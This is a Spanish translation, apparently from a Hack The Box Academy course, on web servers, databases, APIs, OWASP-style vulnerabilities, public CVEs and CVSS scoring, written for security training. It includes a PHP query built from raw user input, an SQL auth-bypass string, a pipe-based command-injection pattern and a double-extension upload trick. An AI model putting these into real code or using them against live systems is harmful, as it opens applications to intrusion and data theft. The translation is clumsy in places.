Se pueden utilizar muchos tipos de servidores web para ejecutar aplicaciones web. La mayoría de estos pueden manejar todo tipo de solicitudes HTTP complejas, y generalmente son gratuitas. Incluso podemos desarrollar nuestro propio servidor web básico utilizando lenguajes como `Python`, `JavaScript`, y `PHP`. Sin embargo, para cada idioma, hay una aplicación web popular que está optimizada para manejar grandes cantidades de tráfico web, lo que nos ahorra tiempo en la creación de nuestro propio servidor web.

---

## Apache

![Apache](https://academy.hackthebox.com/storage/modules/75/apache.png)

[Apache](https://www.apache.org/) 'o `httpd`' es el servidor web más común en Internet, hosting más que `40%` de todos los sitios web de Internet. `Apache` por lo general viene preinstalado en la mayoría `Linux` distribuciones y también se pueden instalar en servidores Windows y macOS.

`Apache` se utiliza generalmente con `PHP` para el desarrollo de aplicaciones web, pero también es compatible con otros idiomas como `.Net`, `Python`, `Perl`e incluso lenguajes de SO como `Bash` a través `CGI`. Los usuarios pueden instalar una amplia variedad de `Apache` módulos para ampliar su funcionalidad y soportar más idiomas. Por ejemplo, para apoyar el servicio `PHP` archivos, los usuarios deben instalar `PHP` en el servidor back-end, además de instalar el `mod_php` módulo para `Apache`.

`Apache` es un proyecto de código abierto, y los usuarios de la comunidad pueden acceder a su código fuente para solucionar problemas y buscar vulnerabilidades. Está bien mantenido y parcheado regularmente contra las vulnerabilidades para mantenerlo a salvo contra la explotación. Además, está muy bien documentado, lo que facilita relativamente el uso y la configuración de diferentes partes del servidor web. `Apache` es comúnmente utilizado por startups y empresas más pequeñas, ya que es fácil de desarrollar. Aún así, algunas grandes empresas utilizan Apache, incluyendo:

|`Apple`|`Adobe`|`Baidu`|
|---|---|---|

---

## NGINX

![NGINX](https://academy.hackthebox.com/storage/modules/75/nginx.png)

[NGINX](https://www.nginx.com/) es el segundo servidor web más común en Internet, alojando aproximadamente `30%` de todos los sitios web de Internet. `NGINX` se enfoca en atender muchas solicitudes web concurrentes con memoria relativamente baja y carga de CPU utilizando una arquitectura asíncrona para hacerlo. Esto hace `NGINX` un servidor web muy confiable para aplicaciones web populares y las principales empresas de todo el mundo, por lo que es el servidor web más popular entre los sitios web de alto tráfico, con alrededor del 60% de los 100,000 sitios web principales que utilizan `NGINX`.

`NGINX` también es gratuito y de código abierto, lo que brinda los mismos beneficios mencionados anteriormente, como seguridad y confiabilidad. Algunos sitios web populares que utilizan `NGINX` incluir:

|`Google`|`Facebook`|`Twitter`|`Cisco`|`Intel`|`Netflix`|`HackTheBox`|
|---|---|---|---|---|---|---|

---

## IIS

![iis](https://academy.hackthebox.com/storage/modules/75/iis.png)

[IIS (Servicios de Información de Internet)](https://en.wikipedia.org/wiki/Internet_Information_Services) es el tercer servidor web más común en Internet, alojando alrededor `15%` de todos los sitios web de Internet. `IIS` es desarrollado y mantenido por Microsoft y se ejecuta principalmente en servidores Microsoft Windows. `IIS` se utiliza generalmente para alojar aplicaciones web desarrolladas para Microsoft .NET framework, pero también se puede utilizar para alojar aplicaciones web desarrolladas en otros idiomas como `PHP`, o alojar otros tipos de servicios como `FTP`. Además, `IIS` está muy bien optimizado para la integración de Active Directory e incluye características como `Windows Auth` para autenticar usuarios usando Active Directory, permitiéndoles iniciar sesión automáticamente en aplicaciones web.

Aunque no es el servidor web más popular, muchas grandes organizaciones utilizan `IIS` como su servidor web. Muchos de ellos usan Windows Server en su back-end o dependen en gran medida de Active Directory dentro de su organización. Algunos sitios web populares que utilizan IIS incluyen:

|`Microsoft`|`Office365`|`Skype`|`Stack Overflow`|`Dell`|
|---|---|---|---|---|

Aparte de estos 3 servidores web, hay muchos otros servidores web de uso común, como [Tomcat Apache](https://tomcat.apache.org/) para `Java` aplicaciones web, y [Nodo.JS](https://nodejs.org/en/) para aplicaciones web desarrolladas utilizando `JavaScript` en el back-end.


# Databases

---

Las aplicaciones web utilizan back-end [bases de datos](https://en.wikipedia.org/wiki/Database) para almacenar diversos contenidos e información relacionada con la aplicación web. Estos pueden ser activos principales de aplicaciones web como imágenes y archivos, contenido de aplicaciones web como publicaciones y actualizaciones, o datos de usuarios como nombres de usuario y contraseñas. Esto permite que las aplicaciones web almacenen y recuperen datos de manera fácil y rápida y habiliten contenido dinámico que es diferente para cada usuario.

Hay muchos tipos diferentes de bases de datos, cada una de las cuales se ajusta a un cierto tipo de uso. La mayoría de los desarrolladores buscan ciertas características en una base de datos, como `speed` en el almacenamiento y recuperación de datos, `size` al almacenar grandes cantidades de datos, `scalability` a medida que la aplicación web crece, y `cost`.

---

## Relacional (SQL)

[Relacional](https://en.wikipedia.org/wiki/Relational_database) las bases de datos (SQL) almacenan sus datos en tablas, filas y columnas. Cada tabla puede tener claves únicas, que pueden vincular tablas y crear relaciones entre tablas.

Por ejemplo, podemos tener un `users` tabla en una base de datos relacional que contiene columnas como `id`, `username`, `first_name`, `last_name`y así sucesivamente. El `id` se puede utilizar como la tecla de tabla. Otra mesa, `posts`, puede contener publicaciones realizadas por todos los usuarios, con columnas como `id`, `user_id`, `date`, `content`y así sucesivamente.

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_relational_db.jpg)

Podemos vincular el `id` de la `users` mesa a la `user_id` en el `posts` tabla para recuperar fácilmente los detalles del usuario para cada publicación, sin tener que almacenar todos los detalles del usuario con cada publicación.

Una tabla puede tener más de una clave, ya que otra columna se puede usar como una clave para vincular con otra tabla. Por ejemplo, el `id` la columna se puede utilizar como una clave para vincular el `posts` tabla a otra tabla que contiene comentarios, cada uno de los cuales pertenece a una determinada publicación, etc.

La relación entre tablas dentro de una base de datos se llama Esquema.

De esta manera, mediante el uso de bases de datos relacionales, se vuelve muy rápido y fácil recuperar todos los datos sobre un determinado elemento de todas las bases de datos. Por ejemplo, podemos recuperar todos los detalles vinculados a un determinado usuario de todas las tablas con una sola consulta. Esto hace que las bases de datos relacionales sean muy rápidas y confiables para grandes conjuntos de datos que tienen una estructura y diseño claros. Las bases de datos también hacen que la gestión de datos sea muy eficiente.

Algunas de las bases de datos relacionales más comunes incluyen:

|Tipo|Descripción|
|---|---|
|[MySQL](https://en.wikipedia.org/wiki/MySQL)|La base de datos más utilizada en Internet. Es una base de datos de código abierto y se puede utilizar de forma totalmente gratuita|
|[MSSQL](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)|Implementación de una base de datos relacional de Microsoft. Ampliamente utilizado con servidores Windows y servidores web IIS|
|[Oráculo](https://en.wikipedia.org/wiki/Oracle_Database)|Una base de datos muy fiable para las grandes empresas, y se actualiza con frecuencia con soluciones de base de datos innovadoras para que sea más rápido y más fiable. Puede ser costoso, incluso para las grandes empresas|
|[PostgreSQL](https://en.wikipedia.org/wiki/PostgreSQL)|Otra base de datos relacional gratuita y de código abierto. Está diseñado para ser fácilmente extensible, lo que permite agregar nuevas características avanzadas sin necesidad de un cambio importante en el diseño inicial de la base de datos|

Otras bases de datos SQL comunes incluyen: `SQLite`, `MariaDB`, `Amazon Aurora`, y `Azure SQL`.

---

## No relacional (NoSQL)

A [base de datos no relacional](https://en.wikipedia.org/wiki/NoSQL) no utiliza tablas, filas, columnas, claves primarias, relaciones o esquemas. En cambio, a `NoSQL` la base de datos almacena datos utilizando varios modelos de almacenamiento, dependiendo del tipo de datos almacenados.

Debido a la falta de una estructura definida para la base de datos, `NoSQL` las bases de datos son muy escalables y flexibles. Cuando se trata de conjuntos de datos que no están muy bien definidos y estructurados, a `NoSQL` la base de datos sería la mejor opción para almacenar nuestros datos.

Hay 4 modelos de almacenamiento comunes para `NoSQL` bases de datos:

- Clave-Valor
- Basado en Documentos
- Amplia Columna
- Gráfico

Cada uno de los modelos anteriores tiene una forma diferente de almacenar datos. Por ejemplo, el `Key-Value` el modelo generalmente almacena datos en `JSON` o `XML`y tiene una clave para cada par, almacenando todos sus datos como su valor:

![Ejemplo HTML](https://academy.hackthebox.com/storage/modules/75/web_apps_non-relational_db.jpg)

El ejemplo anterior se puede representar usando `JSON` como sigue:

Código: json

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

Se parece a un par diccionario/mapa/valor de clave en idiomas como `Python` o `PHP` es.e. `{'key':'value'}`', donde el `key` suele ser una cuerda, el `value` puede ser una cadena, diccionario o cualquier objeto de clase.

El `Document-Based` el modelo almacena datos en complejos `JSON` los objetos y cada objeto tienen ciertos metadatos mientras almacenan el resto de los datos de manera similar a la `Key-Value` modelo.

Algunos de los más comunes `NoSQL` las bases de datos incluyen:

|Tipo|Descripción|
|---|---|
|[MongoDB](https://en.wikipedia.org/wiki/MongoDB)|El más común `NoSQL` base de datos. Es gratuito y de código abierto, utiliza el `Document-Based` modela y almacena datos en `JSON` objetos|
|[ElasticSearch](https://en.wikipedia.org/wiki/Elasticsearch)|Otro código libre y abierto `NoSQL` base de datos. Está optimizado para almacenar y analizar grandes conjuntos de datos. Como su nombre indica, la búsqueda de datos dentro de esta base de datos es muy rápida y eficiente|
|[Apache Cassandra](https://en.wikipedia.org/wiki/Apache_Cassandra)|También gratuito y de código abierto. Es muy escalable y está optimizado para manejar con gracia valores defectuosos|

Otros comunes `NoSQL` las bases de datos incluyen: `Redis`, `Neo4j`, `CouchDB`, y `Amazon DynamoDB`.

---

## Uso en Aplicaciones Web

La mayoría de los lenguajes y marcos de desarrollo web modernos facilitan la integración, el almacenamiento y la recuperación de datos de varios tipos de bases de datos. Pero primero, la base de datos debe instalarse y configurarse en el servidor de back-end, y una vez que está en funcionamiento, las aplicaciones web pueden comenzar a utilizarla para almacenar y recuperar datos.

Por ejemplo, dentro de un `PHP` aplicación web, una vez `MySQL` está en funcionamiento, podemos conectarnos al servidor de base de datos con:

Código: php

```php
$conn = new mysqli("localhost", "user", "pass");
```

Entonces, podemos crear una nueva base de datos con:

Código: php

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

Después de eso, podemos conectarnos a nuestra nueva base de datos y comenzar a usar el `MySQL` base de datos a través de `MySQL` sintaxis, justo dentro `PHP`, como sigue:

Código: php

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```

Las aplicaciones web generalmente usan la entrada del usuario al recuperar datos. Por ejemplo, cuando un usuario utiliza la función de búsqueda para buscar a otros usuarios, su entrada de búsqueda se pasa a la aplicación web, que utiliza la entrada para buscar dentro de la base de datos(s).

Código: php

```php
$searchInput =  $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
$result = $conn->query($query);
```

Finalmente, la aplicación web envía el resultado al usuario:

Código: php

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

Este ejemplo básico nos muestra lo fácil que es utilizar bases de datos. Sin embargo, si no se codifica de forma segura, el código de base de datos puede provocar una variedad de problemas, como [Vulnerabilidades de inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection).


# Development Frameworks & APIs

---

Además de los servidores web que pueden alojar aplicaciones web en varios idiomas, hay muchos marcos de desarrollo web comunes que ayudan a desarrollar archivos y funcionalidades básicas de aplicaciones web. Con la mayor complejidad de las aplicaciones web, puede ser difícil crear una aplicación web moderna y sofisticada desde cero. Por lo tanto, la mayoría de las aplicaciones web populares se desarrollan utilizando marcos web.

Como la mayoría de las aplicaciones web comparten una funcionalidad común, como el registro de usuarios, los marcos de desarrollo web facilitan la implementación rápida de esta funcionalidad y la vinculan a los componentes frontales, lo que hace que una aplicación web sea completamente funcional. Algunos de los marcos de desarrollo web más comunes incluyen:

- [Laravel](https://laravel.com/) (`PHP`): generalmente utilizado por startups y empresas más pequeñas, ya que es potente pero fácil de desarrollar.
- [Expreso](https://expressjs.com/) (`Node.JS`): utilizado por `PayPal`, `Yahoo`, `Uber`, `IBM`, y `MySpace`.
- [Django](https://www.djangoproject.com/) (`Python`): utilizado por `Google`, `YouTube`, `Instagram`, `Mozilla`, y `Pinterest`.
- [Rails](https://rubyonrails.org/) (`Ruby`): utilizado por `GitHub`, `Hulu`, `Twitch`, `Airbnb`, e incluso `Twitter` en el pasado.

Cabe señalar que los sitios web populares generalmente utilizan una variedad de marcos y servidores web, en lugar de solo uno.

---

## API

Un aspecto importante del desarrollo de aplicaciones web de back-end es el uso de la Web [API](https://en.wikipedia.org/wiki/API) y HTTP Solicitar parámetros para conectar el front-end y el back-end para poder enviar datos de un lado a otro entre los componentes front-end y back-end y llevar a cabo diversas funciones dentro de la aplicación web.

Para que el componente front-end interactúe con el back-end y solicite que se realicen ciertas tareas, utilizan API para solicitar al componente back-end una tarea específica con entrada específica. Los componentes de back-end procesan estas solicitudes, realizan las funciones necesarias y devuelven una cierta respuesta a los componentes de front-end, que finalmente renderiza la salida del usuario final en el lado del cliente.

---

#### Parámetros de Consulta

El método predeterminado para enviar argumentos específicos a una página web es a través de `GET` y `POST` solicitar parámetros. Esto permite que los componentes frontales especifiquen valores para ciertos parámetros utilizados dentro de la página para que los componentes de back-end los procesen y respondan en consecuencia.

Por ejemplo, a `/search.php` la página tomaría un `item` parámetro, que se puede utilizar para especificar el elemento de búsqueda. Pasar un parámetro a través de un `GET` la solicitud se realiza a través de la URL '`/search.php?item=apples`', mientras `POST` los parámetros se pasan a través `POST` datos en la parte inferior de la `POST` `HTTP` solicitud:

Código: http

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

Los parámetros de consulta permiten que una sola página reciba varios tipos de entrada, cada uno de los cuales se puede procesar de manera diferente. Para ciertos otros escenarios, las API web pueden ser mucho más rápidas y eficientes de usar. El [Módulo de solicitudes web](https://academy.hackthebox.com/course/preview/web-requests) profundiza en `HTTP` solicitudes.

---

## API Web

Una API ([Interfaz de Programación de Aplicaciones](https://en.wikipedia.org/wiki/API)) es una interfaz dentro de una aplicación que especifica cómo la aplicación puede interactuar con otras aplicaciones. Para las Aplicaciones Web, es lo que permite el acceso remoto a la funcionalidad en los componentes de back-end. Las API no son exclusivas de las aplicaciones web y se utilizan para aplicaciones de software en general. Las API web generalmente se acceden a través de `HTTP` protocolo y generalmente se manejan y traducen a través de servidores web.

![Ejemplos de API](https://academy.hackthebox.com/storage/modules/75/api_examples.jpg)

Una aplicación web meteorológica, por ejemplo, puede tener una determinada API para recuperar el clima actual de una ciudad determinada. Podemos solicitar la URL de la API y pasar el nombre de la ciudad o la identificación de la ciudad, y devolvería el clima actual en un `JSON` objeto. Otro ejemplo es la API de Twitter, que nos permite recuperar los últimos Tweets de una determinada cuenta en `XML` o `JSON` formatos, e incluso nos permite enviar un Tweet 'si autenticado', y así sucesivamente.

Para habilitar el uso de API dentro de una aplicación web, los desarrolladores deben desarrollar esta funcionalidad en el back-end de la aplicación web utilizando los estándares de API como `SOAP` o `REST`.

---

## JABÓN

El `SOAP` ([Acceso a Objetos Simples](https://en.wikipedia.org/wiki/SOAP)) el estándar comparte datos a través de `XML`, donde se realiza la solicitud en `XML` a través de una solicitud HTTP, y la respuesta también se devuelve `XML`. Los componentes del extremo frontal están diseñados para analizar esto `XML` salida correctamente. El siguiente es un ejemplo `SOAP` mensaje:

Código: xml

```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>

</soap:Envelope>
```

`SOAP` es muy útil para transferir datos estructurados (es decir, un objeto de clase completo), o incluso datos binarios, y a menudo se usa con objetos serializados, todo lo cual permite compartir datos complejos entre componentes front-end y back-end y analizarlos correctamente. También es muy útil para compartir _majestuoso_ objetos: es decir, compartir/cambiar el estado actual de una página web, que se está volviendo más común con las aplicaciones web modernas y las aplicaciones móviles.

Sin embargo, `SOAP` puede ser difícil de usar para principiantes o requerir solicitudes largas y complicadas incluso para consultas más pequeñas, como básicas `search` o `filter` consultas. Aquí es donde el `REST` El estándar API es más útil.

---

## DESCANSAR

El `REST` ([Transferencia Representativa del Estado](https://en.wikipedia.org/wiki/Representational_state_transfer)) el estándar comparte datos a través de la ruta de URL 'i.e. `search/users/1`', y por lo general devuelve la salida en `JSON` formato 'es decir, userid `1`'.

A diferencia de Parámetros de Consulta, `REST` Las API generalmente se centran en páginas que esperan que un tipo de entrada pase directamente a través de la ruta URL, sin especificar su nombre o tipo. Esto suele ser útil para consultas como `search`, `sort`, o `filter`. Por eso `REST` Las API generalmente dividen la funcionalidad de la aplicación web en API más pequeñas y utilizan estas solicitudes de API más pequeñas para permitir que la aplicación web realice acciones más avanzadas, haciendo que la aplicación web sea más modular y escalable.

Respuestas a `REST` Las solicitudes de API generalmente se realizan en `JSON` el formato y los componentes frontales se desarrollan para manejar esta respuesta y renderizarla correctamente. Otros formatos de salida para `REST` incluir `XML`, `x-www-form-urlencoded`, o incluso datos sin procesar. Como se vio anteriormente en el `database` sección, el siguiente es un ejemplo de un `JSON` respuesta a la `GET /category/posts/` Solicitud API:

Código: json

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

`REST`utiliza varios métodos HTTP para realizar diferentes acciones en la aplicación web:

- `GET`solicitar recuperar datos
- `POST`solicitud de creación de datos (no-idempotente)
- `PUT`solicitud para crear o reemplazar datos existentes (idempotent)
- `DELETE`solicitar eliminar datos



# Common Web Vulnerabilities

---

Si estábamos realizando una prueba de penetración en una aplicación web desarrollada internamente o no encontramos ningún exploit público para una aplicación web pública, podemos identificar manualmente varias vulnerabilidades. También podemos descubrir vulnerabilidades causadas por configuraciones erróneas, incluso en aplicaciones web disponibles públicamente, ya que este tipo de vulnerabilidades no son causadas por la versión pública de la aplicación web, sino por una configuración incorrecta realizada por los desarrolladores. Los siguientes ejemplos son algunos de los tipos de vulnerabilidad más comunes para aplicaciones web, parte de [Top 10 OWASP](https://owasp.org/www-project-top-ten/) vulnerabilidades para aplicaciones web.

---

## Autenticación Rota/Control de Acceso

`Broken authentication` y `Broken Access Control` se encuentran entre las vulnerabilidades más comunes y más peligrosas para las aplicaciones web.

`Broken Authentication`se refiere a vulnerabilidades que permiten a los atacantes eludir las funciones de autenticación. Por ejemplo, esto puede permitir que un atacante inicie sesión sin tener un conjunto válido de credenciales o permitir que un usuario normal se convierta en administrador sin tener los privilegios para hacerlo.

`Broken Access Control`se refiere a vulnerabilidades que permiten a los atacantes acceder a páginas y características a las que no deberían tener acceso. Por ejemplo, un usuario normal obtiene acceso al panel de administración.

Por ejemplo, `College Management System 1.2` tiene un simple [Auth Bypass](https://www.exploit-db.com/exploits/47388) vulnerabilidad que nos permite iniciar sesión sin tener una cuenta, ingresando lo siguiente para el campo de correo electrónico: `' or 0=0 #`y usar cualquier contraseña con él.

---

## Carga de Archivos Maliciosos

Otra forma común de obtener control sobre las aplicaciones web es mediante la carga de scripts maliciosos. Si la aplicación web tiene una función de carga de archivos y no valida correctamente los archivos cargados, podemos cargar un script malicioso (es decir, un `PHP` script), que nos permitirá ejecutar comandos en el servidor remoto.

Aunque esta es una vulnerabilidad básica, muchos desarrolladores no conocen estas amenazas, por lo que no verifican y validan adecuadamente los archivos cargados. Además, algunos desarrolladores realizan comprobaciones e intentan validar los archivos cargados, pero estas comprobaciones a menudo se pueden omitir, lo que aún nos permitiría cargar scripts maliciosos.

Por ejemplo, el plugin de WordPress `Responsive Thumbnail Slider 1.0` se puede explotar para cargar cualquier archivo arbitrario, incluidos scripts maliciosos, cargando un archivo con una extensión doble (es decir. `shell.php.jpg`). Incluso hay un [Módulo Metasploit](https://www.rapid7.com/db/modules/exploit/multi/http/wp_responsive_thumbnail_slider_upload/) eso nos permite explotar esta vulnerabilidad fácilmente.

---

## Inyección de Comando

Muchas aplicaciones web ejecutan comandos locales del Sistema Operativo para realizar ciertos procesos. Por ejemplo, una aplicación web puede instalar un plugin de nuestra elección mediante la ejecución de un comando OS que descarga ese plugin, utilizando el nombre del plugin proporcionado. Si no se filtra y desinfecta adecuadamente, los atacantes pueden inyectar otro comando que se ejecutará junto con el comando originalmente previsto (es decir, como el nombre del complemento), lo que les permite ejecutar comandos directamente en el servidor de back-end y obtener control sobre él. Este tipo de vulnerabilidad se llama [inyección de comandos](https://owasp.org/www-community/attacks/Command_Injection).

Esta vulnerabilidad está muy extendida, ya que los desarrolladores pueden no desinfectar adecuadamente la entrada del usuario o usar pruebas débiles para hacerlo, lo que permite a los atacantes evitar cualquier comprobación o filtrado implementado y ejecutar sus comandos.

Por ejemplo, el plugin de WordPress `Plainview Activity Monitor 20161228` tiene un [vulnerabilidad](https://www.exploit-db.com/exploits/45274) eso permite a los atacantes inyectar su comando en el `ip` valor, simplemente agregando `| COMMAND...` después del `ip` valor.

---

## Inyección SQL (SQLi)

Otra vulnerabilidad muy común en las aplicaciones web es una `SQL Injection` vulnerabilidad. De manera similar a una vulnerabilidad de Inyección de comandos, esta vulnerabilidad puede ocurrir cuando la aplicación web ejecuta una consulta SQL, incluido un valor tomado de la entrada suministrada por el usuario.

Por ejemplo, en el `database` sección, vimos un ejemplo de cómo una aplicación web usaría la entrada de usuario para buscar dentro de una determinada tabla, con la siguiente línea de código:

Código: php

```php
$query = "select * from users where name like '%$searchInput%'";
```

Si la entrada del usuario no se filtra y valida correctamente (como es el caso con `Command Injections`), podemos ejecutar otra consulta SQL junto con esta consulta, lo que eventualmente nos permitirá tomar el control de la base de datos y su servidor de alojamiento.

Por ejemplo, el mismo anterior `College Management System 1.2` sufre de una inyección SQL [vulnerabilidad](https://www.exploit-db.com/exploits/47388), en el que podemos ejecutar otro `SQL` consulta que siempre devuelve `true`, lo que significa que autenticamos con éxito, lo que nos permite iniciar sesión en la aplicación. Podemos usar la misma vulnerabilidad para recuperar datos de la base de datos o incluso obtener control sobre el servidor de alojamiento.

Veremos estas vulnerabilidades una y otra vez en nuestro viaje de aprendizaje y evaluaciones del mundo real. Es importante familiarizarse con cada uno de estos, ya que incluso una comprensión básica de cada uno nos dará una ventaja en cualquier ámbito de la seguridad de la información. Los módulos posteriores cubrirán cada una de estas vulnerabilidades en profundidad.


# Public Vulnerabilities

---

Las vulnerabilidades de componentes back-end más críticas son aquellas que pueden ser atacadas externamente y pueden aprovecharse para tomar el control del servidor back-end sin necesidad de acceso local a ese servidor (es decir, pruebas de penetración externa). Estas vulnerabilidades generalmente son causadas por errores de codificación cometidos durante el desarrollo de los componentes de back-end de una aplicación web. Por lo tanto, existe una amplia variedad de tipos de vulnerabilidades en esta área, que van desde vulnerabilidades básicas que pueden explotarse con relativa facilidad hasta vulnerabilidades sofisticadas que requieren un conocimiento profundo de toda la aplicación web.

---

## CVE Público

Como muchas organizaciones implementan aplicaciones web que se utilizan públicamente, como aplicaciones web de código abierto y propietarias, estas aplicaciones web tienden a ser probadas por muchas organizaciones y expertos de todo el mundo. Esto lleva a descubrir con frecuencia una gran cantidad de vulnerabilidades, la mayoría de las cuales se parchean y luego se comparten públicamente y se les asigna una CVE ([Vulnerabilidades y Exposiciones Comunes](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures)) registro y puntuación.

Muchos evaluadores de penetración también hacen pruebas de concepto para probar si una cierta vulnerabilidad pública puede ser explotada y generalmente hacen que estas vulnerabilidades estén disponibles para uso público, para pruebas y fines educativos. Esto hace que la búsqueda de exploits públicos sea el primer paso que debemos seguir para las aplicaciones web.

Consejo: El primer paso es identificar la versión de la aplicación web. Esto se puede encontrar en muchos lugares, como el código fuente de la aplicación web. Para aplicaciones web de código abierto, podemos comprobar el repositorio de la aplicación web e identificar dónde se muestra el número de versión (por ejemplo, en la página (version.php)), y luego comprobar la misma página en nuestra aplicación web de destino para confirmar.

Una vez que identificamos la versión de la aplicación web, podemos buscar exploits públicos en Google para esta versión de la aplicación web. También podemos utilizar bases de datos de exploits en línea, como [Explotar DB](https://www.exploit-db.com/), [DB Rapid7](https://www.rapid7.com/db/), o [Laboratorio de Vulnerabilidad](https://www.vulnerability-lab.com/). El siguiente ejemplo muestra una búsqueda de exploits públicos de WordPress en [DB Rapid7](https://www.rapid7.com/db/):

   

![](https://academy.hackthebox.com/storage/modules/75/rapid7-db.jpg)

Por lo general, estaríamos interesados en exploits con un puntaje CVE de 8-10 o exploits que conduzcan a `Remote Code Execution`. También se deben considerar otros tipos de exploits públicos si no hay ninguno de los anteriores disponible.

Además, estas vulnerabilidades no son exclusivas de las aplicaciones web y se aplican a los componentes utilizados por la aplicación web. Si una aplicación web utiliza componentes externos (por ejemplo, un complemento), también debemos buscar vulnerabilidades para estos componentes externos.

---

## Sistema Común de Puntuación de Vulnerabilidad (CVSS)

El [Sistema Común de Puntuación de Vulnerabilidad (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System) es un estándar de la industria de código abierto para evaluar la gravedad de las vulnerabilidades de seguridad. Este sistema de puntuación se utiliza a menudo como una medida estándar para las organizaciones y los gobiernos que necesitan producir puntuaciones de gravedad precisas y consistentes para las vulnerabilidades de sus sistemas. Esto ayuda con la priorización de los recursos y la respuesta a una amenaza dada.

Las puntuaciones CVSS se basan en una fórmula que utiliza varias métricas: `Base`, `Temporal`, y `Environmental`. Al calcular la gravedad de una vulnerabilidad utilizando CVSS, el `Base` las métricas producen una puntuación que varía de 0 a 10, modificada aplicando `Temporal` y `Environmental` métricas. El [Base de Datos Nacional de Vulnerabilidad (NVD)](https://nvd.nist.gov/) proporciona puntajes CVSS para casi todas las vulnerabilidades conocidas y divulgadas públicamente. En este momento, el NVD solo proporciona `Base` puntuaciones basadas en las características inherentes de una vulnerabilidad dada. Los sistemas de puntuación actuales en su lugar son CVSS v2 y CVSS v3. Hay varias diferencias entre los sistemas v2 y v3, a saber, cambios en el `Base` y `Environmental` groups to account for additional metrics. More information about the differences between the two scoring systems can be found [here](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3).

CVSS scoring ratings differ slightly between V2 and V3 as can be seen in the following tables:

|CVSS V2.0 Ratings||
|---|---|
|**Severity**|**Base Score Range**|
|Low|0.0-3.9|
|Medium|4.0-6.9|
|High|7.0-10.0|

|**CVSS V3.0 Ratings**||
|---|---|
|**Severity**|**Base Score Range**|
|None|0.0|
|Low|0.1-3.9|
|Medium|4.0-6.9|
|High|7.0-8.9|
|Critical|9.0-10.0|

El NVD no tiene en cuenta `Temporal` y `Environmental` métricas porque las primeras pueden cambiar con el tiempo debido a eventos externos. Esta última es una métrica personalizada basada en el impacto potencial de la vulnerabilidad en una organización determinada. El NVD proporciona un [Calculadora CVSS v2](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator) y a [Calculadora CVSS v3](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) que las organizaciones pueden utilizar para factorizar el riesgo adicional de `Temporal` y `Environmental` datos únicos para ellos. Las calculadoras son muy interactivas y se pueden utilizar para ajustar la puntuación CVSS a nuestro entorno. Podemos movernos sobre cada métrica para leer más sobre ella y determinar exactamente cómo se aplica a nuestra organización. A continuación se muestra una vista de ejemplo de la calculadora CVSS v3:

![imagen](https://academy.hackthebox.com/storage/modules/75/cvssv3_calc.png)

Juega con la calculadora CVSS y ve cómo se pueden ajustar las diversas métricas para llegar a una puntuación determinada. Revise algunos CVE e intente llegar a la misma puntuación CVSS. Cómo cambia la puntuación CVSS cuando se aplica `Temporal` y `Environmental` ¿métricas? Esto es útil [guía](https://www.first.org/cvss/user-guide) es extremadamente útil para comprender V2 y V3 y cómo usar las calculadoras para llegar a una puntuación determinada.

---

## Vulnerabilidades de Servidor de Back-end

Al igual que las vulnerabilidades públicas para aplicaciones web, también deberíamos considerar buscar vulnerabilidades para otros componentes de back-end, como el servidor de back-end o el servidor web.

Las vulnerabilidades más críticas para los componentes de back-end se encuentran en los servidores web, ya que son de acceso público a través de `TCP` protocolo. Un ejemplo de una vulnerabilidad de servidor web bien conocida es el `Shell-Shock`, que afectó a los servidores web de Apache lanzados durante y antes de 2014 y utilizados `HTTP` solicitudes para obtener control remoto sobre el servidor de back-end.

En cuanto a las vulnerabilidades en el servidor back-end o la base de datos, generalmente se utilizan después de obtener acceso local al servidor back-end o a la red back-end, que se puede obtener a través de `external` vulnerabilidades o durante las pruebas de penetración interna. Por lo general, se utilizan para obtener un alto acceso privilegiado en el servidor de back-end o en la red de back-end o para obtener control sobre otros servidores dentro de la misma red.

Aunque no son directamente explotables externamente, estas vulnerabilidades siguen siendo críticas y deben ser parcheadas para proteger toda la aplicación web de ser comprometida.

# Next Steps

---

En este módulo, hemos aprendido algunos, pero de ninguna manera todos, conceptos básicos de aplicaciones web. Ahora deberíamos tener una comprensión fundamental de cómo se construye una aplicación web, cómo funciona y qué peligros puede introducir en un entorno corporativo.

Es importante adoptar un enfoque práctico para desarrollar aún más nuestra comprensión y aplicar los temas que se enseñan en este módulo. Recomendamos revisar el material en combinación con el desarrollo de una pequeña aplicación web. Algunos de los próximos pasos que se pueden tomar son:

|**Paso**|**Hacer**|
|---|---|
|`1.`|Configure una VM con un servidor web|
|`2.`|Crear un `HTML` página|
|`3.`|Diseñarlo con `CSS`|
|`4.`|Agregue algunas funciones simples con `JavaScript`|
|`5.`|Programe una aplicación web simple|
|`6.`|Conecte su aplicación web a la base de datos|
|`7.`|Experimenta con APIs|
|`8.`|Pruebe su aplicación para detectar diversas vulnerabilidades y agujeros de seguridad|
|`9.`|Intente ajustar su código y configuraciones para cerrar las vulnerabilidades|

El desarrollo de una pequeña aplicación web proporcionará una comprensión mucho más profunda de la estructura y la funcionalidad. Aprender a configurar y administrar dicho servidor web, el rol de la base de datos y cómo se vinculan las piezas individuales de código es una experiencia invaluable.

